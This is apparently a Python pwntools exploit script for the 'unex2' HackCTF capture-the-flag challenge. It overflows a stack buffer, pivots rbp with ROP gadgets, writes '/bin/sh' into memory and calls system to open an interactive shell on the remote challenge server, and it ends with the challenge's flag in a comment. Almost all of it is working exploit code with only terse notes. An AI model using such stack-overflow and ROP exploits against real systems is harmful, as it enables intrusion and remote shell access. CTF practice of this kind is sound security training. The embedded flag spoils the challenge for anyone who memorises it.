from pwn import * 
#64bit binary, simply called fwrite, fgets. 
#stack size is 0x18 bytes, input length is 0x40bytes. 
#regis : rdi -> rsi -> rdx -> rcx but gadgets not found..
#prob says dynstr, it seems like find "sh" string. 
#hopely, i solve unex1 prob to modify rbp. 

pop_rdi = 0x400773 # pop rdi ; ret
pop_rsi_r15 = 0x400771 # pop rsi ; pop r15 ; ret
pop_rbp = 0x4005e0 # pop rbp ; ret
bin = 0x601080+0x600
main = 0x04006ee
system = 0x0400684

#p = process("./unex2")
p = remote("ctf.j0n9hyun.xyz",3029)

fwrite_plt = 0x400560
fwrite_got = 0x601038

payload = "a"*0x18 
payload += p64(pop_rbp) + p64(bin+0x10)+ p64(main)
pause()
p.sendlineafter("fflush@dynstr!",payload)

payload2 = "/bin/sh\x00"+"\x00"*0x10
payload2 += p64(pop_rdi) + p64(bin) + p64(system)
#b * do_system+1180
p.sendline(payload2)


p.interactive()
#HackCTF{u5e_syst3m_t0_get_le4k}
